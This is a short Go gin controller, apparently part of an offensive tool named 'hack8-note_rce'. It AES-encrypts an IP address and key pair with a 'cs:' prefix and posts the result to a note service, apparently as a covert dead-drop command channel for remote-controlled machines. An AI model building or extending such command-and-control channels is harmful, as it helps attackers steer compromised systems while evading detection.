package cotroller

import (
	"github.com/gin-gonic/gin"
	"hack8-note_rce/Util"
)

// api/cs POST
func Cs(c *gin.Context) {
	ip := c.PostForm("ip")
	publickey := c.PostForm("publickey")
	privateKey := c.PostForm("privatekey")
	noteaddr := c.PostForm("noteaddr")
	aeskey := c.PostForm("aeskey")

	base64, _ := Util.AesCbcEncryptBase64([]byte("cs:"+ip+":"+publickey+":"+privateKey), []byte(aeskey), []byte(Util.Ivaes))

	Util.WriteNote(noteaddr, base64)

	c.JSON(200, gin.H{"message": "上传请求已成功发送"})

}
